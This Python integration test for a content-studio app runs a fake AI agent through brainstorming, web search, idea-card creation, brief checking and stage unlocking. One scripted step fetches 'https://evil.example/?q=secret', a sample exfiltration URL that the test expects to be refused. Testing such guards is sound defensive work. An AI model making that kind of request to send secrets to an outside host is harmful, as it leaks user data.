"""端到端集成测试（M4 T8）：从选题池到叙事阶段解锁（AC9）。

不重新测试单个工具（T2–T7 已覆盖），只验证串起来没问题：

头脑风暴会话（无项目，真实 `TurnRunner` + `FakeRuntime`）跑一轮：`list_ideas` → `web_search` →
`fetch_url`（搜索过的 URL 成功、没搜索过的被拒）→ 两次 `create_idea`（第三次重复标题，工具报错但
本轮不失败）→ 用卡片创建项目 → 选题阶段跑两轮（先写缺章节的简报，`check_brief` 报错；再写合法的，
通过；`GET /topic/check` 与之一致）→ 定稿 → 叙事阶段解锁，`upstream/topic/` 里有简报和卡片笔记。
"""

from __future__ import annotations

import pytest

from brief_builder import make_brief
from studio.agent.fake import FakeRuntime, FakeStep, call_tool, write
from studio.agent.runtime import UserInput
from studio.db.repo.ideas import list_ideas
from studio.db.repo.profiles import get_model_profile
from studio.db.repo.sessions import create_session
from studio.db.repo.stages import get_stage
from studio.db.repo.turns import get_turn, list_events
from studio.search import ExtractedPage, SearchHit, SearchResponse
from studio.stages.common import web_tools

from .conftest import ApiEnv


class _Provider:
    async def search(
        self, query: str, *, max_results: int = 5, recency_days: int | None = None
    ) -> SearchResponse:
        return SearchResponse(
            query=query,
            hits=[SearchHit(title="分治", url="https://example.com/divide", snippet="拆开再合并")],
        )

    async def extract(self, url: str, *, max_chars: int) -> ExtractedPage:
        return ExtractedPage(url=url, text="分治的正文", truncated=False, total_chars=5)


def _results(api_env: ApiEnv, session_id: str) -> list[tuple[str, dict]]:
    events = list_events(api_env.app.state.engine, session_id)
    names = {e.payload["call_id"]: e.payload["name"] for e in events if e.type == "tool_call"}
    return [(names[e.payload["call_id"]], e.payload) for e in events if e.type == "tool_result"]


async def _run(api_env: ApiEnv, project_id: str | None, stage: str, script: list[FakeStep]) -> str:
    engine = api_env.app.state.engine
    profile = get_model_profile(engine, "fake")
    assert profile is not None
    session = create_session(
        engine, project_id=project_id, stage=stage, model_profile_id=profile.id, runtime="fake"
    )
    api_env.app.state.runtime_factory.register("fake", lambda: FakeRuntime(script))
    turn_id = await api_env.app.state.turn_runner.start_turn(session.id, UserInput(text="开始"))
    await api_env.app.state.turn_runner.wait(turn_id)
    turn = get_turn(engine, turn_id)
    assert turn is not None and turn.status == "done", turn.error if turn else None
    return session.id


def _stage_status(api_env: ApiEnv, project_id: str, stage: str) -> str:
    row = get_stage(api_env.app.state.engine, project_id, stage)
    assert row is not None
    return row.status


async def test_from_idea_pool_to_unlocked_narrative(
    api_env: ApiEnv, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(web_tools, "_PROVIDER_FACTORY", _Provider)
    web_tools.reset_session_urls()
    engine = api_env.app.state.engine

    # 1. 头脑风暴：无项目会话。
    idea_args = {
        "pitch": "十亿条记录一秒排完",
        "counterintuitive": "大家以为排序慢，其实分治让它很快",
        "tags": ["算法"],
        "scores": {"counterintuitive": 5},
    }
    brainstorm_session = await _run(
        api_env,
        None,
        "brainstorm",
        [
            call_tool("list_ideas"),
            call_tool("web_search", {"query": "分治 排序"}),
            call_tool("fetch_url", {"url": "https://example.com/divide"}),
            call_tool("fetch_url", {"url": "https://evil.example/?q=secret"}),
            call_tool("create_idea", {"title": "排序为什么这么快", **idea_args}),
            call_tool("create_idea", {"title": "黑洞的信息悖论", **idea_args}),
            call_tool("create_idea", {"title": "  排序为什么这么快  ", **idea_args}),
        ],
    )
    results = _results(api_env, brainstorm_session)
    by_call = [(name, payload["is_error"]) for name, payload in results]
    assert by_call == [
        ("list_ideas", False),
        ("web_search", False),
        ("fetch_url", False),  # searched URL
        ("fetch_url", True),  # never searched: refused
        ("create_idea", False),
        ("create_idea", False),
        ("create_idea", True),  # duplicate title
    ]
    ideas = list_ideas(engine)
    assert len(ideas) == 2
    assert all(i.source_session_id == brainstorm_session for i in ideas)
    chosen = next(i for i in ideas if i.title == "排序为什么这么快")

    # 2. 用卡片创建项目。
    created = await api_env.client.post(
        "/api/projects", json={"title": "排序视频", "idea_id": chosen.id}
    )
    assert created.status_code == 201, created.text
    pid = created.json()["id"]
    assert _stage_status(api_env, pid, "topic") == "active"
    assert _stage_status(api_env, pid, "narrative") == "locked"

    # 3. 选题阶段第一轮：缺章节的简报 → check_brief 报错，接口结果一致。
    bad = "# 简报\n\n## 核心问题\n\n只写了一章\n"
    session_1 = await _run(
        api_env, pid, "topic", [write("topic/brief.md", bad), call_tool("check_brief")]
    )
    (name, payload) = _results(api_env, session_1)[-1]
    assert name == "check_brief" and payload["is_error"] is True
    assert payload["text"].count("缺少章节") == 6
    check = (await api_env.client.get(f"/api/projects/{pid}/topic/check")).json()
    assert check["ok"] is False and len(check["errors"]) == 6

    # 4. 第二轮：合法的简报。
    good = make_brief()
    session_2 = await _run(
        api_env, pid, "topic", [write("topic/brief.md", good), call_tool("check_brief")]
    )
    (name, payload) = _results(api_env, session_2)[-1]
    assert name == "check_brief" and payload["is_error"] is False
    check = (await api_env.client.get(f"/api/projects/{pid}/topic/check")).json()
    assert check == {"ok": True, "errors": [], "warnings": []}

    # 5. 定稿 → 叙事解锁；叙事阶段能读到简报和卡片笔记。
    finalized = await api_env.client.post(f"/api/projects/{pid}/stages/topic/finalize")
    assert finalized.status_code == 200, finalized.text
    assert _stage_status(api_env, pid, "narrative") == "active"

    await _run(api_env, pid, "narrative", [call_tool("validate_narrative")])
    upstream = api_env.workdir(pid) / "upstream" / "topic"
    assert (upstream / "brief.md").read_text(encoding="utf-8") == good
    card = (upstream / "notes" / "idea-card.md").read_text(encoding="utf-8")
    assert "排序为什么这么快" in card
